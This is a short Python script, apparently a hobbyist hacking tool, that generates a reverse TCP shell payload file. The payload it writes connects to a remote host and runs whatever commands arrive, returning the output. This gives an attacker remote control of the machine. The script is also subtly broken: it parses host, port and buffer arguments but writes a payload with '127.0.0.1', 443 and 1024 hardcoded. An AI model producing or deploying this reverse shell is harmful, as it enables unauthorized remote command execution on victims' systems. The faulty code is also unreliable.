#!/usr/bin/env python

from os import getcwd
import argparse


ap = argparse.ArgumentParser(add_help=False)
ap.add_argument("-h", "--host", required=True, help="host IP")
ap.add_argument("-p", "--port", required=True, help="host Port")
ap.add_argument("-b", "--buffersize", help="buffer size, can be 1024, 2048 ... (if not specified, default value is 1024)")
ap.add_argument("-d", "--destination", help="destination path where to store payload at (if not specified, it will be saved in the current working directory by default")
try:
    args = vars(ap.parse_args())
except:
    print("\n _____ _____ ______  ______           _                 _  \n|_   _/  __ \| ___ \ | ___ \         | |               | | \n  | | | /  \/| |_/ / | |_/ /_ _ _   _| | ___   __ _  __| | \n  | | | |    |  __/  |  __/ _` | | | | |/ _ \ / _` |/ _` | \n  | | | \__/\| |     | | | (_| | |_| | | (_) | (_| | (_| | \n  \_/  \____/\_|     \_|  \__,_|\__, |_|\___/ \__,_|\__,_| \n                                 __/ |                     \n                                |___/                      \n")
    print("$> A simple python reverse TCP payload generator\n$> Author: An0nY\n")
    print("Parameters:\n    -h -> Host IP address (REQUIRED)\n    -p -> Host Port number. Use TCP ports such as 80, 443, 8080 ... (REQUIRED)\n    -b -> Buffer size to use. 1024 ~ 1kb, 2048 ~ 2kb. Default is 1024 (OPTIONAL)\n    -d -> Destination path where the payload will be saved. Default is the current working directory (OPTIONAL)\n")
    exit()

print("[PROCESS] Generating reverse TCP payload ...")

host = args["host"]
try:
    port = int(args["port"])
except:
    print("[CRITICAL] Please enter a correct port ! Quitting ...")
    exit()
if args["buffersize"] != None:
    try:
        buff_size = int(args["buffersize"])
    except:
        print("[CRITICAL] Please enter a correct buffersize or leave it as default ! Quitting ...")
        exit()
if args["buffersize"] == None:
    buff_size = 1024
if args["destination"] != None:
    dest = args["destination"] + "\payload.py"
if args["destination"] == None:
    dest = getcwd() + "\payload.py"

payload = open(dest, "w+")
print("[PROCESS] Successfully initialized payload file, writing payload ...")
payload.write("import socket, subprocess\nhost = '127.0.0.1'\nport = 443\nbuff_size = 1024\ns = socket.socket()\ns.connect((host, port))\nwhile True:\n    cmd = s.recv(buff_size).decode('UTF-8')\n    if cmd.lower() == 'exit' or cmd.lower() == 'quit':\n        break\n    try:\n        s.send(subprocess.getoutput(cmd).encode('UTF-8'))\n    except:\n        s.send('[WARNING] Failed to execute remote command ...'.encode('UTF-8'))\ns.close()")
payload.close()
print("[SUCCESS] Successfully wrote reverse TCP payload to file %s !" % (dest))